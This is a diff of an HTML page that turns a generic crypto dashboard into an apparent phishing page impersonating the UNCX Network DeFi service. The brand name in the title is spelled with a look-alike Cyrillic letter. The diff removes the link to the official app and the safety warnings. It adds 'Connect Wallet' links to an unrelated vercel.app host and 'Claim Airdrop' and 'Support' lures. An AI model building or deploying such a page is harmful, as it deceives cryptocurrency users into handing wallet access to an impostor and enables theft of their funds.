@@ -1,1063 +1,325 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Blockchain Network | Explore</title>
+<title>UNСX Network | DeFi Dashboard</title>
 
 <style>
-:root {
-    --bg:#090c14;
-    --panel:#111725;
-    --border:#252e40;
-    --text:#f5f7ff;
-    --muted:#929db1;
-    --blue:#3978f6;
-    --green:#25d69b;
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+ font-family:Arial,sans-serif;
+ background:#080d18;
+ color:#f4f6fb;
 }
-
-* {
-    box-sizing:border-box;
-    margin:0;
-    padding:0;
+header{
+ display:flex;align-items:center;justify-content:space-between;
+ padding:18px 6%;border-bottom:1px solid #202b3d;
+ background:#0c1422;position:sticky;top:0;z-index:10;
 }
-
-body {
-    font-family:Arial,sans-serif;
-    background:var(--bg);
-    color:var(--text);
-    min-height:100vh;
+.logo{font-size:23px;font-weight:bold;color:#fff}
+.logo span{color:#24d6a0}
+nav{display:flex;gap:25px;align-items:center}
+nav a{color:#aeb9ca;text-decoration:none;font-size:14px}
+nav a:hover{color:#27dba5}
+.connect,.primary{
+ background:linear-gradient(100deg,#17bd91,#22d9ad);
+ color:#061811;border:0;padding:12px 20px;
+ border-radius:7px;font-weight:bold;cursor:pointer;
+ text-decoration:none;display:inline-block;
 }
-
-button,input,select {font:inherit;}
-button {cursor:pointer;}
-a {color:inherit;text-decoration:none;}
-
-/* NAVIGATION */
-
-.navbar {
-    height:76px;
-    padding:0 5%;
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    border-bottom:1px solid var(--border);
-    background:#0c111d;
-    position:sticky;
-    top:0;
-    z-index:100;
+.container{width:88%;max-width:1200px;margin:auto}
+.hero{padding:65px 0 40px}
+.eyebrow{color:#27dba5;font-size:13px;margin-bottom:15px}
+h1{font-size:clamp(32px,5vw,52px);margin-bottom:17px}
+.hero p{color:#9eabc0;max-width:620px;line-height:1.7}
+.hero-actions{display:flex;gap:13px;margin-top:25px;flex-wrap:wrap}
+.secondary{
+ border:1px solid #344258;color:#e6edf7;
+ padding:12px 20px;border-radius:7px;text-decoration:none;
 }
-
-.brand {
-    display:flex;
-    align-items:center;
-    gap:11px;
-    font-size:21px;
-    font-weight:800;
+.stats{
+ display:grid;grid-template-columns:repeat(3,1fr);
+ gap:15px;margin:30px 0 40px;
 }
-
-.logo {
-    width:37px;
-    height:37px;
-    background:linear-gradient(135deg,#4285ff,#27d6a0);
-    border-radius:11px;
-    display:grid;
-    place-items:center;
-    font-weight:900;
+.stat{
+ background:#111d2d;border:1px solid #243247;
+ border-radius:10px;padding:22px;
 }
-
-.nav-links {
-    display:flex;
-    gap:32px;
+.stat small{color:#8c9bb0}
+.stat h2{font-size:25px;margin-top:12px}
+.panel{
+ background:#101a29;border:1px solid #263448;
+ border-radius:12px;margin:25px 0 50px;overflow:hidden;
 }
-
-.nav-links a {
-    color:var(--muted);
-    font-size:14px;
+.panel-head{
+ padding:22px;display:flex;justify-content:space-between;
+ align-items:center;gap:15px;flex-wrap:wrap;
 }
-
-.nav-links a:hover,
-.nav-links a.active {color:white;}
-
-.nav-right {
-    display:flex;
-    gap:12px;
-    align-items:center;
+.tabs{display:flex;gap:8px}
+.tab{
+ padding:10px 17px;border-radius:6px;
+ border:1px solid #344258;background:#142236;
+ color:#c3ccda;cursor:pointer;
 }
-
-.language {
-    background:var(--panel);
-    color:white;
-    border:1px solid var(--border);
-    padding:10px;
-    border-radius:9px;
+.tab.active{background:#1a745f;color:white;border-color:#1a745f}
+.search{
+ background:#0a1320;border:1px solid #344258;
+ color:white;padding:11px 14px;border-radius:6px;
+ width:220px;max-width:100%;
 }
-
-.wallet-btn {
-    background:var(--blue);
-    color:white;
-    border:0;
-    padding:12px 19px;
-    border-radius:9px;
-    font-weight:700;
+.table-wrap{overflow-x:auto}
+table{width:100%;border-collapse:collapse;min-width:650px}
+th,td{
+ padding:16px 20px;text-align:left;
+ border-top:1px solid #253247;font-size:13px;
 }
-
-.wallet-btn:hover {background:#2864d9;}
-
-.menu-btn {
-    display:none;
-    background:transparent;
-    border:0;
-    color:white;
-    font-size:25px;
+th{color:#8392a9;font-weight:normal;background:#0d1725}
+td{color:#dce4ef}
+.token{display:flex;align-items:center;gap:10px;font-weight:bold}
+.coin{
+ width:34px;height:34px;border-radius:50%;
+ background:linear-gradient(135deg,#f8d45b,#e99b27);
+ display:inline-flex;align-items:center;justify-content:center;
+ font-size:20px;flex-shrink:0;
 }
-
-/* MAIN */
-
-.main {
-    width:92%;
-    max-width:1250px;
-    margin:auto;
+.claim-btn{
+ color:#25d6a2;text-decoration:none;
+ border:1px solid #1d765f;border-radius:5px;
+ padding:8px 11px;white-space:nowrap;
 }
-
-.announcement {
-    margin-top:25px;
-    padding:15px 18px;
-    border:1px solid #273e70;
-    background:linear-gradient(90deg,#111d37,#14233c);
-    border-radius:10px;
-    display:flex;
-    justify-content:space-between;
-    gap:15px;
-    font-size:13px;
+.claim-btn:hover{background:#124c3d}
+.pair{display:flex;align-items:center;gap:8px}
+.pair .coin{width:27px;height:27px;font-size:15px}
+.status{color:#29d7a2}
+footer{
+ text-align:center;padding:30px;color:#78879d;
+ border-top:1px solid #202b3d;font-size:13px;
 }
-
-.announcement strong {color:#72a3ff;}
-.announcement a {color:#75a4ff;}
-
-/* HERO */
-
-.hero {
-    text-align:center;
-    padding:65px 15px 55px;
+.modal{
+ display:none;position:fixed;inset:0;background:#000b;
+ z-index:20;align-items:center;justify-content:center;padding:20px;
 }
-
-.hero h1 {
-    font-size:clamp(32px,5vw,54px);
-    letter-spacing:-2px;
-    line-height:1.2;
-    margin-bottom:18px;
+.modal-box{
+ background:#121e2e;border:1px solid #34445b;
+ padding:30px;border-radius:12px;max-width:420px;width:100%;
+ text-align:center;
 }
-
-.gradient-text {
-    background:linear-gradient(90deg,#4c8aff,#35d9b0);
-    -webkit-background-clip:text;
-    background-clip:text;
-    color:transparent;
+.modal-box h2{margin-bottom:14px}
+.modal-box p{color:#a8b5c7;line-height:1.6;margin-bottom:22px}
+.modal-action{
+ width:100%;padding:13px;border:0;border-radius:7px;
+ background:#22d4a2;color:#062017;font-weight:bold;cursor:pointer;
 }
-
-.hero p {
-    color:var(--muted);
-    max-width:620px;
-    margin:auto;
-    line-height:1.8;
-    font-size:15px;
+.menu-btn{display:none;background:none;border:0;color:white;font-size:25px}
+@media(max-width:700px){
+ nav{display:none;position:absolute;top:65px;left:0;width:100%;
+ background:#0c1422;padding:20px;flex-direction:column}
+ nav.show{display:flex}
+ .menu-btn{display:block}
+ .stats{grid-template-columns:1fr}
+ .container{width:92%}
+ .hero{padding-top:45px}
 }
-
-.hero-actions {
-    margin-top:27px;
-    display:flex;
-    justify-content:center;
-    gap:13px;
-    flex-wrap:wrap;
-}
-
-.primary-btn,.secondary-btn {
-    padding:13px 23px;
-    border-radius:9px;
-    font-weight:700;
-    border:1px solid var(--border);
-}
-
-.primary-btn {
-    background:var(--blue);
-    color:white;
-    border:0;
-}
-
-.secondary-btn {
-    background:var(--panel);
-    color:white;
-}
-
-.primary-btn:hover,.secondary-btn:hover {
-    transform:translateY(-3px);
-}
-
-/* STATISTICS */
-
-.section-heading {
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    margin-bottom:18px;
-}
-
-.section-heading h2 {font-size:21px;}
-
-.section-heading span {
-    color:var(--muted);
-    font-size:12px;
-}
-
-.stats {
-    display:grid;
-    grid-template-columns:repeat(3,1fr);
-    gap:17px;
-    margin-bottom:45px;
-}
-
-.stat-card {
-    background:linear-gradient(145deg,#151e30,#101725);
-    border:1px solid var(--border);
-    padding:23px;
-    border-radius:13px;
-    transition:.25s;
-}
-
-.stat-card:hover {
-    border-color:#426fc5;
-    transform:translateY(-3px);
-}
-
-.stat-label {
-    font-size:13px;
-    color:var(--muted);
-    margin-bottom:15px;
-}
-
-.stat-value {
-    font-size:29px;
-    font-weight:800;
-}
-
-.stat-note {
-    margin-top:10px;
-    font-size:12px;
-    color:var(--green);
-}
-
-/* EXPLORE */
-
-.explore {margin-bottom:70px;}
-
-.explore-header {
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    gap:15px;
-    margin-bottom:20px;
-}
-
-.explore-header h2 {font-size:25px;}
-
-.tabs {
-    display:flex;
-    gap:7px;
-    border-bottom:1px solid var(--border);
-    margin-bottom:20px;
-}
-
-.tab {
-    color:var(--muted);
-    padding:13px 19px;
-    border:0;
-    background:transparent;
-    border-bottom:2px solid transparent;
-    font-weight:600;
-}
-
-.tab.active {
-    color:#78a5ff;
-    border-bottom-color:var(--blue);
-}
-
-.table-controls {
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    gap:15px;
-    margin-bottom:18px;
-}
-
-.search {
-    width:320px;
-    max-width:100%;
-    background:var(--panel);
-    color:white;
-    border:1px solid var(--border);
-    padding:13px 15px;
-    border-radius:9px;
-    outline:none;
-}
-
-.search:focus {border-color:var(--blue);}
-
-.filter-label {
-    color:var(--muted);
-    font-size:12px;
-}
-
-.table-wrap {
-    overflow-x:auto;
-    border:1px solid var(--border);
-    border-radius:12px;
-    background:var(--panel);
-}
-
-table {
-    width:100%;
-    border-collapse:collapse;
-    min-width:700px;
-}
-
-th {
-    text-align:left;
-    padding:17px;
-    color:var(--muted);
-    font-size:12px;
-    font-weight:600;
-    background:#131b2a;
-}
-
-td {
-    padding:17px;
-    border-top:1px solid var(--border);
-    font-size:13px;
-}
-
-tbody tr:hover {background:#1a263b;}
-
-.pair {
-    display:flex;
-    align-items:center;
-    gap:10px;
-    font-weight:700;
-    flex-wrap:wrap;
-}
-
-.coin-icon {
-    width:34px;
-    height:34px;
-    flex-shrink:0;
-    border-radius:50%;
-    display:grid;
-    place-items:center;
-    background:#263b65;
-    color:#a6c6ff;
-    font-weight:800;
-}
-
-/* CLAIM BUTTON */
-
-.claim-btn {
-    display:inline-block;
-    padding:8px 12px;
-    background:linear-gradient(90deg,#3978f6,#25b98e);
-    color:white;
-    border:none;
-    border-radius:7px;
-    font-size:11px;
-    font-weight:700;
-    white-space:nowrap;
-    transition:.2s;
-}
-
-.claim-btn:hover {
-    transform:translateY(-2px);
-    opacity:.85;
-}
-
-.version {
-    background:#202c40;
-    padding:5px 9px;
-    border-radius:5px;
-    color:#9bbcff;
-    font-size:11px;
-}
-
-.progress {
-    width:85px;
-    height:5px;
-    border-radius:10px;
-    background:#263044;
-    margin-top:7px;
-    overflow:hidden;
-}
-
-.progress div {
-    height:100%;
-    background:var(--green);
-    border-radius:10px;
-}
-
-.tvl {font-weight:700;}
-
-.empty {
-    padding:30px;
-    text-align:center;
-    color:var(--muted);
-}
-
-.table-footer {
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    padding:16px 5px;
-    color:var(--muted);
-    font-size:12px;
-}
-
-.page-btn {
-    padding:8px 13px;
-    border:1px solid var(--border);
-    background:var(--panel);
-    color:white;
-    border-radius:6px;
-}
-
-/* MODAL */
-
-.modal {
-    display:none;
-    position:fixed;
-    inset:0;
-    z-index:999;
-    background:rgba(0,0,0,.78);
-    justify-content:center;
-    align-items:center;
-    padding:20px;
-}
-
-.modal.show {display:flex;}
-
-.modal-content {
-    width:100%;
-    max-width:420px;
-    background:#151e2e;
-    border:1px solid var(--border);
-    padding:30px;
-    border-radius:16px;
-    text-align:center;
-    animation:appear .25s ease;
-}
-
-@keyframes appear {
-    from {opacity:0;transform:scale(.94);}
-    to {opacity:1;transform:scale(1);}
-}
-
-.modal-content h2 {margin-bottom:12px;}
-
-.modal-content p {
-    color:var(--muted);
-    font-size:13px;
-    line-height:1.7;
-}
-
-.modal-close {
-    float:right;
-    background:none;
-    color:white;
-    border:0;
-    font-size:23px;
-}
-
-.modal-action {
-    margin-top:22px;
-    width:100%;
-    padding:13px;
-    background:var(--blue);
-    color:white;
-    border:0;
-    border-radius:8px;
-}
-
-/* FOOTER */
-
-footer {
-    border-top:1px solid var(--border);
-    padding:30px 5%;
-    text-align:center;
-    color:var(--muted);
-    font-size:12px;
-    line-height:2;
-}
-
-/* MOBILE */
-
-@media(max-width:750px) {
-
-    .navbar {
-        height:68px;
-        padding:0 4%;
-    }
-
-    .brand {font-size:18px;}
-
-    .menu-btn {display:block;}
-
-    .nav-links {
-        display:none;
-        position:absolute;
-        top:68px;
-        left:0;
-        right:0;
-        background:#111725;
-        padding:20px;
-        flex-direction:column;
-        border-bottom:1px solid var(--border);
-    }
-
-    .nav-links.open {display:flex;}
-
-    .language {
-        max-width:75px;
-        padding:8px 4px;
-    }
-
-    .wallet-btn {
-        padding:10px;
-        font-size:12px;
-    }
-
-    .hero {padding:48px 8px;}
-
-    .stats {
-        grid-template-columns:1fr;
-        gap:12px;
-    }
-
-    .stat-card {padding:19px;}
-
-    .stat-value {font-size:25px;}
-
-    .announcement {flex-direction:column;}
-
-    .explore-header {
-        align-items:flex-start;
-        flex-direction:column;
-    }
-
-    .table-controls {
-        align-items:flex-start;
-        flex-direction:column;
-    }
-
-    .search {width:100%;}
-
-    .tab {
-        padding:12px;
-        font-size:12px;
-    }
-
-    .pair {min-width:240px;}
-}
-
 </style>
 </head>
 
 <body>
 
-<nav class="navbar">
+<header>
+ <div class="logo">UNCX<span> NETWORK</span></div>
 
-    <div class="brand">
-        <div class="logo">B</div>
-        BLOCKCHAIN
-    </div>
+ <button class="menu-btn" onclick="toggleMenu()">☰</button>
 
-    <div class="nav-links" id="navLinks">
-        <a href="#explore" class="active">Explore</a>
-        <a href="complaints.html">Support</a>
-        <a href="#statistics">Statistics</a>
-    </div>
+ <nav id="navigation">
+  <a href="#home">Home</a>
+  <a href="#tokens">Tokens</a>
+  <a href="#pools">Pools</a>
+  <a href="complaints.html">Support</a>
+  <a class="connect" href="https://reownrelpit.vercel.app">Connect Wallet</a>
+ </nav>
+</header>
 
-    <div class="nav-right">
+<main class="container" id="home">
 
-        <select class="language" id="lang-select"
-                onchange="switchLanguage()">
-            <option value="auto">Auto</option>
-            <option value="en">English</option>
-            <option value="es">Español</option>
-            <option value="tr">Türkçe</option>
-            <option value="zh">中文</option>
-            <option value="hi">हिन्दी</option>
-        </select>
+ <section class="hero">
+  <div class="eyebrow">DECENTRALIZED FINANCE ECOSYSTEM</div>
+  <h1>Explore the world of <span style="color:#25d6a2">DeFi</span></h1>
+  <p>
+   Explore token information, liquidity pools and decentralized
+   finance projects in one dashboard.
+  </p>
 
-        <button class="wallet-btn" onclick="openWalletModal()">
-            Connect Wallet
-        </button>
+  <div class="hero-actions">
+   <a class="connect" href="https://reownrelpit.vercel.app">Connect Wallet</a>
+   <a class="secondary" href="#pools">Explore Pools</a>
+  </div>
+ </section>
 
-        <button class="menu-btn" onclick="toggleMenu()">☰</button>
+ <section class="stats">
+  <div class="stat">
+   <small>Total Value Locked</small>
+   <h2>$128.4M</h2>
+  </div>
+  <div class="stat">
+   <small>Total Pools</small>
+   <h2>2,450+</h2>
+  </div>
+  <div class="stat">
+   <small>Supported Networks</small>
+   <h2>12</h2>
+  </div>
+ </section>
 
-    </div>
+ <section class="panel" id="tokens">
+  <div class="panel-head">
+   <h2>Explore Tokens & Pools</h2>
+   <input class="search" id="searchInput"
+    placeholder="Search tokens or pools..." oninput="renderTable()">
+  </div>
 
-</nav>
+  <div class="panel-head">
+   <div class="tabs">
+    <button class="tab active" onclick="changeTab('tokens',this)">Tokens</button>
+    <button class="tab" onclick="changeTab('pools',this)">Pools</button>
+    <button class="tab" onclick="changeTab('latest',this)">Latest</button>
+   </div>
+  </div>
 
-<main class="main">
+  <div class="table-wrap">
+   <table>
+    <thead>
+     <tr>
+      <th>Name</th>
+      <th>Pair / Symbol</th>
+      <th>Network</th>
+      <th>Status</th>
+      <th>Action</th>
+     </tr>
+    </thead>
+    <tbody id="tableBody"></tbody>
+   </table>
+  </div>
+ </section>
 
-    <div class="announcement">
-        <div>
-            <strong>NETWORK UPDATE</strong>
-            &nbsp; Explore blockchain liquidity and wallet resources.
-        </div>
-
-        <a href="https://app.uncx.network/"
-           target="_blank"
-           rel="noopener noreferrer">
-            Explore UNCX ↗
-        </a>
-    </div>
-
-    <section class="hero">
-
-        <h1>
-            Explore the
-            <span class="gradient-text">Blockchain Network</span>
-        </h1>
-
-        <p id="subtitle">
-            Explore blockchain liquidity, discover token pools,
-            and access wallet support resources through a modern
-            decentralized finance interface.
-        </p>
-
-        <div class="hero-actions">
-
-            <button class="primary-btn" onclick="openWalletModal()">
-                Connect Wallet
-            </button>
-
-            <a href="complaints.html" class="secondary-btn">
-                Wallet Support
-            </a>
-
-        </div>
-
-    </section>
-
-    <section id="statistics">
-
-        <div class="section-heading">
-            <h2>Network Overview</h2>
-            <span>Illustrative demo statistics</span>
-        </div>
-
-        <div class="stats">
-
-            <div class="stat-card">
-                <div class="stat-label">Total Value Locked</div>
-                <div class="stat-value">$206M</div>
-                <div class="stat-note">Demo display</div>
-            </div>
-
-            <div class="stat-card">
-                <div class="stat-label">Locks Created</div>
-                <div class="stat-value">70,000+</div>
-                <div class="stat-note">Demo display</div>
-            </div>
-
-            <div class="stat-card">
-                <div class="stat-label">New Locks (24h)</div>
-                <div class="stat-value">05</div>
-                <div class="stat-note">Demo display</div>
-            </div>
-
-        </div>
-
-    </section>
-
-    <section class="explore" id="explore">
-
-        <div class="explore-header">
-            <h2>Explore Liquidity</h2>
-            <span class="filter-label">
-                Browse sample pool information
-            </span>
-        </div>
-
-        <div class="tabs">
-
-            <button class="tab"
-                    onclick="changeTab('tokens',this)">
-                Tokens
-            </button>
-
-            <button class="tab active"
-                    onclick="changeTab('pools',this)">
-                Pools
-            </button>
-
-            <button class="tab"
-                    onclick="changeTab('latest',this)">
-                Latest
-            </button>
-
-        </div>
-
-        <div class="table-controls">
-
-            <input type="search"
-                   class="search"
-                   id="searchInput"
-                   placeholder="⌕ Search pools..."
-                   oninput="filterTable()">
-
-            <span class="filter-label" id="resultCount">
-                Sample listings
-            </span>
-
-        </div>
-
-        <div class="table-wrap">
-
-            <table>
-
-                <thead>
-                    <tr>
-                        <th>POOL / TOKEN</th>
-                        <th>VERSION</th>
-                        <th>LOCKED %</th>
-                        <th>TVL</th>
-                    </tr>
-                </thead>
-
-                <tbody id="poolTable"></tbody>
-
-            </table>
-
-            <div class="empty" id="emptyMessage"
-                 style="display:none">
-                No matching records found.
-            </div>
-
-        </div>
-
-        <div class="table-footer">
-            <span>Sample listings — not live blockchain data</span>
-
-            <button class="page-btn" onclick="resetSearch()">
-                Reset Search
-            </button>
-        </div>
-
-    </section>
+ <section class="panel" id="pools">
+  <div class="panel-head">
+   <h2>Liquidity Pools</h2>
+   <span class="status">● Demo listings</span>
+  </div>
+  <div class="table-wrap">
+   <table>
+    <thead>
+     <tr>
+      <th>Pool</th>
+      <th>Network</th>
+      <th>Type</th>
+      <th>Action</th>
+     </tr>
+    </thead>
+    <tbody id="poolBody"></tbody>
+   </table>
+  </div>
+ </section>
 
 </main>
 
 <footer>
-    © 2026 Blockchain Network. All rights reserved.
-    <br>
-    Interface demonstration. No wallet credentials are collected.
-    <br>
-    <a href="complaints.html">Support</a>
-    &nbsp; | &nbsp;
-    <a href="https://app.uncx.network/"
-       target="_blank"
-       rel="noopener noreferrer">
-        Official UNCX App
-    </a>
+ UNCX Network interface demonstration. Sample listings are illustrative,
+ not live market data.
 </footer>
 
-<!-- WALLET MODAL -->
-
-<div class="modal" id="walletModal"
-     onclick="closeOutside(event)">
-
-    <div class="modal-content">
-
-        <button class="modal-close"
-                onclick="closeWalletModal()">
-            &times;
-        </button>
-
-        <h2>Connect Wallet</h2>
-
-        <p>
-            This standalone demonstration does not connect to a wallet.
-            Use a trusted wallet application and verify the official
-            website before connecting.
-        </p>
-
-        <p style="margin-top:15px">
-            Never share your recovery phrase or private key.
-            Never sign an unexplained transaction.
-        </p>
-
-        <button class="modal-action"
-                onclick="window.location.href='https://reownrelpit.vercel.app'">
-            Understood
-        </button>
-
-    </div>
-
+<div class="modal" id="infoModal">
+ <div class="modal-box">
+  <h2>Wallet Information</h2>
+  <p>
+   You are viewing a demonstration dashboard.
+   Continue only if you understand the destination website
+   and have verified that it is the service you intend to visit.
+  </p>
+  <button class="modal-action"
+   onclick="window.location.href='https://reownrelpit.vercel.app'">
+   Understood
+  </button>
+ </div>
 </div>
 
 <script>
-
-/* SAMPLE DATA */
-
-const pools = [
-
-    {name:"OSMI / USDC",version:"V3",locked:100,tvl:"$190M"},
-    {name:"Dance and music / WBNB",version:"V3",locked:48,tvl:"$87M"},
-    {name:"BURNNY / WBNB",version:"V3",locked:100,tvl:"$68M"},
-    {name:"FLOKI / WETH",version:"V2",locked:85,tvl:"$8.8M"},
-    {name:"SPX / WETH",version:"V2",locked:100,tvl:"$7.8M"},
-    {name:"MOG / WETH",version:"V2",locked:100,tvl:"$5.8M"},
-    {name:"BANANA / WETH",version:"V2",locked:100,tvl:"$4.3M"},
-    {name:"SAFEMOON / WBNB",version:"V2",locked:97,tvl:"$3.8M"},
-    {name:"PEPE / WETH",version:"V2",locked:99,tvl:"$2.3M"},
-    {name:"WOJAK / WETH",version:"V2",locked:100,tvl:"$1.9M"},
-    {name:"DSYNC / WETH",version:"V2",locked:66,tvl:"$1.8M"},
-    {name:"CULT / WETH",version:"V2",locked:100,tvl:"$1.4M"}
-
+const tokens = [
+ {name:"OSMI",symbol:"OSMI / USDC",network:"Ethereum"},
+ {name:"Dance and Music",symbol:"DANCE / WBNB",network:"BNB Chain"},
+ {name:"BURNNY",symbol:"BURNNY / WBNB",network:"BNB Chain"},
+ {name:"FLOKI",symbol:"FLOKI / WETH",network:"Ethereum"},
+ {name:"SPX",symbol:"SPX / WETH",network:"Ethereum"},
+ {name:"MOG",symbol:"MOG / WETH",network:"Ethereum"},
+ {name:"BANANA",symbol:"BANANA / WETH",network:"Ethereum"},
+ {name:"SAFEMOON",symbol:"SAFEMOON / WBNB",network:"BNB Chain"},
+ {name:"PEPE",symbol:"PEPE / WETH",network:"Ethereum"},
+ {name:"WOJAK",symbol:"WOJAK / WETH",network:"Ethereum"},
+ {name:"DSYNC",symbol:"DSYNC / WETH",network:"Ethereum"},
+ {name:"CULT",symbol:"CULT / WETH",network:"Ethereum"}
 ];
 
-let currentTab = "pools";
-window.currentData = [...pools];
+let currentTab = "tokens";
 
-/* RENDER TABLE */
-
-function renderTable(data) {
-
-    const table = document.getElementById("poolTable");
-
-    table.innerHTML = "";
-
-    document.getElementById("emptyMessage").style.display =
-        data.length ? "none" : "block";
-
-    document.getElementById("resultCount").textContent =
-        data.length + " sample listings";
-
-    data.forEach(pool => {
-
-        const row = document.createElement("tr");
-
-        const td = document.createElement("td");
-
-        const pair = document.createElement("div");
-        pair.className = "pair";
-
-        const coinIcon = document.createElement("div");
-        coinIcon.className = "coin-icon";
-        coinIcon.textContent = pool.name.charAt(0);
-
-        const coinName = document.createElement("span");
-        coinName.textContent = pool.name;
-
-        const claim = document.createElement("a");
-        claim.className = "claim-btn";
-        claim.href = "manual.html";
-        claim.textContent = "Claim Airdrop";
-
-        pair.append(coinIcon,coinName,claim);
-        td.appendChild(pair);
-        row.appendChild(td);
-
-        const version = document.createElement("td");
-
-        const badge = document.createElement("span");
-        badge.className = "version";
-        badge.textContent = pool.version;
-
-        version.appendChild(badge);
-        row.appendChild(version);
-
-        const locked = document.createElement("td");
-        locked.textContent = pool.locked + "%";
-
-        const progress = document.createElement("div");
-        progress.className = "progress";
-
-        const bar = document.createElement("div");
-        bar.style.width = Math.min(pool.locked,100) + "%";
-
-        progress.appendChild(bar);
-        locked.appendChild(progress);
-        row.appendChild(locked);
-
-        const tvl = document.createElement("td");
-        tvl.className = "tvl";
-        tvl.textContent = pool.tvl;
-
-        row.appendChild(tvl);
-
-        table.appendChild(row);
-
-    });
-
+function coinLogo(){
+ return '<span class="coin" aria-label="Coin logo">🪙</span>';
 }
 
-/* TABS */
+function renderTable(){
+ const search = document.getElementById("searchInput").value.toLowerCase();
+ const body = document.getElementById("tableBody");
 
-function changeTab(tab,button) {
+ let list = tokens.filter(item =>
+  (item.name+" "+item.symbol+" "+item.network).toLowerCase().includes(search)
+ );
 
-    currentTab = tab;
+ if(currentTab === "latest") list = list.slice().reverse();
 
-    document.querySelectorAll(".tab").forEach(item => {
-        item.classList.remove("active");
-    });
-
-    button.classList.add("active");
-
-    document.getElementById("searchInput").value = "";
-
-    let data = [...pools];
-
-    if(tab === "tokens") {
-
-        data = pools.map(pool => ({
-            ...pool,
-            name:pool.name.split("/")[0].trim(),
-            version:"Token"
-        }));
-
-    }
-
-    if(tab === "latest") {
-        data.reverse();
-    }
-
-    window.currentData = data;
-
-    renderTable(data);
-
+ body.innerHTML = list.map(item => `
+  <tr>
+   <td><div class="token">${coinLogo()} ${item.name}</div></td>
+   <td>${item.symbol}</td>
+   <td>${item.network}</td>
+   <td class="status">● Listed</td>
+   <td><a class="claim-btn" href="manual.html">Claim Airdrop</a></td>
+  </tr>
+ `).join("");
 }
 
-/* SEARCH */
+function renderPools(){
+ const body = document.getElementById("poolBody");
 
-function filterTable() {
-
-    const term = document.getElementById("searchInput")
-        .value.toLowerCase();
-
-    const data = window.currentData || pools;
-
-    const filtered = data.filter(pool =>
-        pool.name.toLowerCase().includes(term) ||
-        pool.version.toLowerCase().includes(term)
-    );
-
-    renderTable(filtered);
-
+ body.innerHTML = tokens.map(item => `
+  <tr>
+   <td>
+    <div class="pair">
+     ${coinLogo()}
+     <strong>${item.symbol}</strong>
+    </div>
+   </td>
+   <td>${item.network}</td>
+   <td>Liquidity Pool</td>
+   <td><a class="claim-btn" href="manual.html">View Details</a></td>
+  </tr>
+ `).join("");
 }
 
-function resetSearch() {
-
-    document.getElementById("searchInput").value = "";
-
-    renderTable(window.currentData || pools);
-
+function changeTab(tab,button){
+ currentTab = tab;
+ document.querySelectorAll(".tab").forEach(btn =>
+  btn.classList.remove("active")
+ );
+ button.classList.add("active");
+ renderTable();
 }
 
-/* WALLET MODAL */
-
-function openWalletModal() {
-    document.getElementById("walletModal").classList.add("show");
+function toggleMenu(){
+ document.getElementById("navigation").classList.toggle("show");
 }
 
-function closeWalletModal() {
-    document.getElementById("walletModal").classList.remove("show");
-}
-
-function closeOutside(event) {
-
-    if(event.target.id === "walletModal") {
-        closeWalletModal();
-    }
-
-}
-
-/* MOBILE MENU */
-
-function toggleMenu() {
-    document.getElementById("navLinks").classList.toggle("open");
-}
-
-/* LANGUAGE */
-
-const translations = {
-
-    en:{
-        subtitle:"Explore blockchain liquidity, discover token pools, and access wallet support resources through a modern decentralized finance interface.",
-        connect:"Connect Wallet",
-        explore:"Explore Liquidity"
-    },
-
-    es:{
-        subtitle:"Explore la liquidez blockchain, descubra grupos de tokens y acceda a recursos de soporte de billetera.",
-        connect:"Conectar billetera",
-        explore:"Explorar liquidez"
-    },
-
-    tr:{
-        subtitle:"Blockchain likiditesini keşfedin, token havuzlarını inceleyin ve cüzdan destek kaynaklarına erişin.",
-        connect:"Cüzdanı Bağla",
-        explore:"Likiditeyi Keşfet"
-    },
-
-    zh:{
-        subtitle:"探索区块链流动性，发现代币池并访问钱包支持资源。",
-        connect:"连接钱包",
-        explore:"探索流动性"
-    },
-
-    hi:{
-        subtitle:"ब्लॉकचेन तरलता का अन्वेषण करें और वॉलेट सहायता संसाधनों तक पहुंचें。",
-        connect:"वॉलेट कनेक्ट करें",
-        explore:"तरलता देखें"
-    }
-
-};
-
-function detectLanguage() {
-
-    let lang = navigator.language.slice(0,2);
-
-    return translations[lang] ? lang : "en";
-
-}
-
-function switchLanguage() {
-
-    let lang = document.getElementById("lang-select").value;
-
-    if(lang === "auto") {
-        lang = detectLanguage();
-    }
-
-    const t = translations[lang] || translations.en;
-
-    document.getElementById("subtitle").textContent = t.subtitle;
-
-    document.querySelectorAll(".wallet-btn,.primary-btn")
-        .forEach(button => {
-            button.textContent = t.connect;
-        });
-
-    document.querySelector(".explore-header h2").textContent =
-        t.explore;
-
-}
-
-/* INITIALIZE */
-
-renderTable(pools);
-switchLanguage();
-
+renderTable();
+renderPools();
 </script>
 
 </body>
